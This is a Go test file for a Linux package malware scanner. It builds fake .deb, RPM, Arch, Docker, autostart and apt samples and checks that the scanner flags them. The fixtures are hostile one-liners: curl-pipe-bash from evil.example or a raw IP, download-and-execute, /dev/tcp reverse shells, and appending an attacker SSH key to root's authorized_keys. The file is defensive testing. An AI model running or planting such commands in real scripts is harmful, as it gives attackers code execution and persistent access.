package linuxpkg

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"encoding/binary"
	"fmt"
	"strings"
	"testing"

	"github.com/1ungaka/sentinel-edr/internal/intel"
)

// ── test builders ────────────────────────────────────────────────────────────

// buildAr writes a minimal ar archive (the .deb outer container).
func buildAr(members map[string][]byte, order []string) []byte {
	var b bytes.Buffer
	b.WriteString("!<arch>\n")
	for _, name := range order {
		data := members[name]
		hdr := make([]byte, 60)
		for i := range hdr {
			hdr[i] = ' '
		}
		copy(hdr[0:16], name)
		copy(hdr[48:58], fmt.Sprintf("%-10d", len(data)))
		hdr[58], hdr[59] = 0x60, 0x0a
		b.Write(hdr)
		b.Write(data)
		if len(data)%2 == 1 {
			b.WriteByte('\n')
		}
	}
	return b.Bytes()
}

// buildTarGz builds a gzip-compressed tar carrying the named files.
func buildTarGz(files map[string]string) []byte {
	var raw bytes.Buffer
	tw := tar.NewWriter(&raw)
	for name, body := range files {
		_ = tw.WriteHeader(&tar.Header{Name: name, Mode: 0o755, Size: int64(len(body)), Typeflag: tar.TypeReg})
		_, _ = tw.Write([]byte(body))
	}
	tw.Close()
	var gz bytes.Buffer
	zw := gzip.NewWriter(&gz)
	_, _ = zw.Write(raw.Bytes())
	zw.Close()
	return gz.Bytes()
}

func buildTar(files map[string]string) []byte {
	var raw bytes.Buffer
	tw := tar.NewWriter(&raw)
	for name, body := range files {
		_ = tw.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg})
		_, _ = tw.Write([]byte(body))
	}
	tw.Close()
	return raw.Bytes()
}

// buildDeb assembles a .deb from a control.tar.gz holding the given maintainer
// scripts.
func buildDeb(scripts map[string]string) []byte {
	control := buildTarGz(scripts)
	return buildAr(
		map[string][]byte{
			"debian-binary":  []byte("2.0\n"),
			"control.tar.gz": control,
			"data.tar.gz":    buildTarGz(map[string]string{"./usr/bin/app": "ELF"}),
		},
		[]string{"debian-binary", "control.tar.gz", "data.tar.gz"},
	)
}

// buildRPM builds a minimal RPM with the given name and scriptlet tags. It
// produces exactly the header structure parseRPM expects: a 96-byte lead, an
// empty signature header, then a main header whose store holds null-terminated
// strings.
func buildRPM(name string, scriptlets map[uint32]string) []byte {
	var b bytes.Buffer
	lead := make([]byte, rpmLeadLen)
	copy(lead[0:4], magicRPM)
	b.Write(lead)

	// Empty signature header.
	writeRPMHeader(&b, nil, nil)

	// Main header.
	var store bytes.Buffer
	type ent struct{ tag, typ, off, count uint32 }
	var entries []ent
	add := func(tag, typ uint32, s string) {
		off := uint32(store.Len())
		store.WriteString(s)
		store.WriteByte(0)
		entries = append(entries, ent{tag, typ, off, 1})
	}
	add(rpmtagName, rpmTypeString, name)
	for tag, body := range scriptlets {
		add(tag, rpmTypeString, body)
	}

	var idx bytes.Buffer
	for _, e := range entries {
		var w [16]byte
		binary.BigEndian.PutUint32(w[0:4], e.tag)
		binary.BigEndian.PutUint32(w[4:8], e.typ)
		binary.BigEndian.PutUint32(w[8:12], e.off)
		binary.BigEndian.PutUint32(w[12:16], e.count)
		idx.Write(w[:])
	}
	writeRPMHeaderRaw(&b, uint32(len(entries)), idx.Bytes(), store.Bytes())
	return b.Bytes()
}

func writeRPMHeader(b *bytes.Buffer, idx, store []byte) {
	writeRPMHeaderRaw(b, 0, idx, store)
}

func writeRPMHeaderRaw(b *bytes.Buffer, nindex uint32, idx, store []byte) {
	b.Write(rpmHeaderMagic)
	b.WriteByte(0x01)
	b.Write([]byte{0, 0, 0, 0})
	var n4, h4 [4]byte
	binary.BigEndian.PutUint32(n4[:], nindex)
	binary.BigEndian.PutUint32(h4[:], uint32(len(store)))
	b.Write(n4[:])
	b.Write(h4[:])
	b.Write(idx)
	b.Write(store)
}

// ── tests ────────────────────────────────────────────────────────────────────

func TestDebMaliciousPostinst(t *testing.T) {
	deb := buildDeb(map[string]string{
		"./postinst": "#!/bin/sh\ncurl -fsSL http://evil.example/x.sh | bash\n",
	})
	if Detect(deb) != FormatDeb {
		t.Fatalf("Detect = %q, want deb", Detect(deb))
	}
	r := Analyze(deb, Options{})
	if !r.Detected() {
		t.Fatalf("expected malicious .deb to be detected, score=%d thr=%d findings=%v", r.Score, r.EffectiveThreshold(), r.Findings)
	}
	if !hasClass(r, "linuxpkg.script.curl-pipe-shell") {
		t.Errorf("missing curl-pipe-shell finding: %+v", r.Findings)
	}
}

func TestDebBenignPostinstClean(t *testing.T) {
	deb := buildDeb(map[string]string{
		"./postinst": "#!/bin/sh\nset -e\nldconfig\nupdate-desktop-database -q || true\n",
	})
	r := Analyze(deb, Options{})
	if r.Detected() {
		t.Fatalf("benign .deb should not be detected, score=%d findings=%v", r.Score, r.Findings)
	}
}

func TestRPMReverseShellScriptlet(t *testing.T) {
	rpm := buildRPM("evil", map[uint32]string{
		rpmtagPostin: "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
	})
	if Detect(rpm) != FormatRPM {
		t.Fatalf("Detect = %q, want rpm", Detect(rpm))
	}
	r := Analyze(rpm, Options{})
	if r.Parsed == nil || r.Parsed.Name != "evil" {
		t.Errorf("rpm name not parsed: %+v", r.Parsed)
	}
	if !r.Detected() || !hasClass(r, "linuxpkg.script.reverse-shell") {
		t.Fatalf("expected reverse-shell detection, got score=%d findings=%v", r.Score, r.Findings)
	}
}

func TestArchInstallSSHKey(t *testing.T) {
	install := "post_install() {\n  echo 'ssh-ed25519 AAAA... attacker' >> /root/.ssh/authorized_keys\n}\n"
	pkg := buildTar(map[string]string{".PKGINFO": "pkgname = x\n", ".INSTALL": install})
	if Detect(pkg) != FormatArch {
		t.Fatalf("Detect = %q, want arch", Detect(pkg))
	}
	r := Analyze(pkg, Options{})
	if !r.Detected() || !hasClass(r, "linuxpkg.script.ssh-authorized-keys") {
		t.Fatalf("expected ssh-key detection, got score=%d findings=%v", r.Score, r.Findings)
	}
}

func TestFlatpakSandboxEscape(t *testing.T) {
	manifest := `{
  "app-id": "org.example.App",
  "runtime": "org.freedesktop.Platform",
  "modules": [],
  "finish-args": ["--talk-name=org.freedesktop.Flatpak", "--filesystem=host"]
}`
	if Detect([]byte(manifest)) != FormatFlatpak {
		t.Fatalf("Detect = %q, want flatpak", Detect([]byte(manifest)))
	}
	r := Analyze([]byte(manifest), Options{})
	if !hasClass(r, "linuxpkg.flatpak.talk-portal-escape") {
		t.Fatalf("expected talk-portal-escape, got %v", r.Findings)
	}
}

func TestPKGBUILDDownloadExec(t *testing.T) {
	pkgbuild := "# Maintainer: x\npkgname=evil\nsource=('http://evil/x')\nbuild() {\n  curl http://1.2.3.4/m -o /tmp/m && chmod +x /tmp/m && /tmp/m\n}\npackage() { :; }\n"
	if Detect([]byte(pkgbuild)) != FormatPKGBUILD {
		t.Fatalf("Detect = %q, want pkgbuild", Detect([]byte(pkgbuild)))
	}
	r := Analyze([]byte(pkgbuild), Options{})
	if !r.Detected() {
		t.Fatalf("expected PKGBUILD detection, score=%d findings=%v", r.Score, r.Findings)
	}
}

func TestDockerImageMaliciousHistory(t *testing.T) {
	// A `docker save` tar: manifest.json → config json whose build history ran a
	// curl|bash, plus a reverse-shell ENTRYPOINT.
	config := `{
  "config": {"Entrypoint": ["/bin/sh","-c","bash -i >& /dev/tcp/10.0.0.1/9001 0>&1"], "User": "root"},
  "history": [
    {"created_by": "/bin/sh -c #(nop) FROM debian"},
    {"created_by": "|1 X=1 /bin/sh -c curl -fsSL http://evil/x | bash # buildkit"}
  ]
}`
	files := map[string]string{
		"manifest.json": `[{"Config":"cfg.json","Layers":["l/layer.tar"]}]`,
		"cfg.json":      config,
	}
	img := buildTar(files)
	if Detect(img) != FormatDocker {
		t.Fatalf("Detect = %q, want docker", Detect(img))
	}
	r := Analyze(img, Options{})
	if !r.Detected() {
		t.Fatalf("expected malicious docker image to be detected, score=%d findings=%v", r.Score, r.Findings)
	}
	if !hasClass(r, "linuxpkg.script.curl-pipe-shell") || !hasClass(r, "linuxpkg.script.reverse-shell") {
		t.Errorf("missing expected docker findings: %+v", r.Findings)
	}
}

func TestDockerImageBenignClean(t *testing.T) {
	config := `{"config":{"Cmd":["nginx","-g","daemon off;"]},"history":[{"created_by":"/bin/sh -c apt-get update && apt-get install -y nginx"}]}`
	img := buildTar(map[string]string{
		"manifest.json": `[{"Config":"cfg.json","Layers":[]}]`,
		"cfg.json":      config,
	})
	r := Analyze(img, Options{})
	if r.Detected() {
		t.Fatalf("benign docker image should be clean, score=%d findings=%v", r.Score, r.Findings)
	}
}

func TestAutostartDesktopMalicious(t *testing.T) {
	desktop := "[Desktop Entry]\nType=Application\nName=Updater\nExec=sh -c \"curl -fsSL http://evil/x | bash\"\nX-GNOME-Autostart-enabled=true\n"
	if Detect([]byte(desktop)) != FormatConfig {
		t.Fatalf("Detect = %q, want config", Detect([]byte(desktop)))
	}
	r := Analyze([]byte(desktop), Options{})
	if !r.Detected() {
		t.Fatalf("expected malicious autostart to be detected, score=%d findings=%v", r.Score, r.Findings)
	}
	if !hasClass(r, "linuxpkg.config.autostart-inline-shell") {
		t.Errorf("missing inline-shell config finding: %+v", r.Findings)
	}
}

func TestSystemdUnitTmpExec(t *testing.T) {
	unit := "[Unit]\nDescription=x\n[Service]\nExecStart=/tmp/.hidden/payload --daemon\n[Install]\nWantedBy=multi-user.target\n"
	r := Analyze([]byte(unit), Options{})
	if !hasClass(r, "linuxpkg.config.autostart-world-writable-exec") {
		t.Fatalf("expected world-writable ExecStart finding, got %v", r.Findings)
	}
}

func TestBenignBashrcClean(t *testing.T) {
	bashrc := "export PATH=$HOME/bin:$PATH\nalias ll='ls -la'\nsource /etc/bash_completion\n"
	if Detect([]byte(bashrc)) != FormatConfig {
		t.Fatalf("Detect = %q, want config (shell-rc)", Detect([]byte(bashrc)))
	}
	r := Analyze([]byte(bashrc), Options{})
	if r.Detected() {
		t.Fatalf("benign .bashrc should be clean, score=%d findings=%v", r.Score, r.Findings)
	}
}

func TestBashSetupCurlPipe(t *testing.T) {
	bashrc := "export EDITOR=vim\n# helper\ncurl -s http://evil/setup.sh | bash\n"
	r := Analyze([]byte(bashrc), Options{})
	if !r.Detected() || !hasClass(r, "linuxpkg.script.curl-pipe-shell") {
		t.Fatalf("expected curl-pipe detection in bash setup, got score=%d findings=%v", r.Score, r.Findings)
	}
}

func TestAptSourceTrustedYes(t *testing.T) {
	src := "deb [trusted=yes] http://1.2.3.4/debian stable main\n"
	if Detect([]byte(src)) != FormatConfig {
		t.Fatalf("Detect = %q, want config (apt sources)", Detect([]byte(src)))
	}
	r := Analyze([]byte(src), Options{})
	if !hasClass(r, "linuxpkg.apt.trusted-yes") || !hasClass(r, "linuxpkg.apt.ip-literal-repo") {
		t.Fatalf("expected apt trusted-yes + ip-literal findings, got %v", r.Findings)
	}
}

func TestAptOfficialSourceClean(t *testing.T) {
	src := "deb https://deb.debian.org/debian bookworm main contrib\ndeb https://security.debian.org/debian-security bookworm-security main\n"
	r := Analyze([]byte(src), Options{})
	if r.Detected() {
		t.Fatalf("official https apt source should be clean, score=%d findings=%v", r.Score, r.Findings)
	}
}

func TestZipBundledInstaller(t *testing.T) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, _ := zw.Create("pkg/install.sh")
	_, _ = w.Write([]byte("#!/bin/sh\ncurl -fsSL http://evil/x | sh\n"))
	zw.Close()
	if Detect(buf.Bytes()) != FormatArchive {
		t.Fatalf("Detect = %q, want archive", Detect(buf.Bytes()))
	}
	r := Analyze(buf.Bytes(), Options{})
	if !r.Detected() || !hasClass(r, "linuxpkg.script.curl-pipe-shell") {
		t.Fatalf("expected curl-pipe detection in zipped installer, got score=%d findings=%v", r.Score, r.Findings)
	}
}

func TestSnapDetectedClassic(t *testing.T) {
	// A minimal squashfs-magic buffer carrying snap metadata markers.
	data := append([]byte{}, magicSquashfs...)
	data = append(data, []byte("\x00\x00\x00\x00meta/snap.yaml\nname: x\nconfinement: classic\n")...)
	if Detect(data) != FormatSnap {
		t.Fatalf("Detect = %q, want snap", Detect(data))
	}
	r := Analyze(data, Options{})
	if !hasClass(r, "linuxpkg.snap.classic-confinement") {
		t.Fatalf("expected classic-confinement finding, got %v", r.Findings)
	}
}

func TestIntelFeedMatchInScript(t *testing.T) {
	feed, err := intel.Parse(strings.NewReader("evil.example|c2 domain\n"), "test")
	if err != nil {
		t.Fatal(err)
	}
	// A PKGBUILD whose source pulls from a feed-listed domain, but with no other
	// vector — the feed hit alone should flag it.
	pkgbuild := "# Maintainer: x\npkgname=x\nsource=('https://cdn.evil.example/payload.tar.gz')\nbuild() { :; }\npackage() { :; }\n"
	r := Analyze([]byte(pkgbuild), Options{Intel: feed})
	if !r.Detected() || !hasClass(r, "linuxpkg.intel.domain") {
		t.Fatalf("expected feed domain hit to flag, score=%d findings=%v", r.Score, r.Findings)
	}
}

func TestUnknownFormatClean(t *testing.T) {
	r := Analyze([]byte("just some random text, not a package\n"), Options{})
	if r.Detected() || len(r.Findings) != 0 {
		t.Fatalf("unknown format should be clean, got %+v", r)
	}
}

func TestDebXzControlNotDecoded(t *testing.T) {
	// A control.tar.xz member is detected but honestly reported as not decoded.
	xz := append([]byte{0xfd, '7', 'z', 'X', 'Z', 0x00}, make([]byte, 32)...)
	deb := buildAr(
		map[string][]byte{"debian-binary": []byte("2.0\n"), "control.tar.xz": xz},
		[]string{"debian-binary", "control.tar.xz"},
	)
	r := Analyze(deb, Options{})
	if !hasClass(r, "linuxpkg.deb.scripts-not-decoded") {
		t.Fatalf("expected scripts-not-decoded note for xz control, got %v", r.Findings)
	}
}

func TestExcerptNeverDumpsWholeBody(t *testing.T) {
	body := "prefix " + strings.Repeat("A", 5000) + " suffix"
	got := excerpt(body, 7, 10)
	if len(got) > 130 {
		t.Fatalf("excerpt too long: %d", len(got))
	}
}

func hasClass(r *Result, class string) bool {
	for _, f := range r.Findings {
		if f.Class == class {
			return true
		}
	}
	return false
}
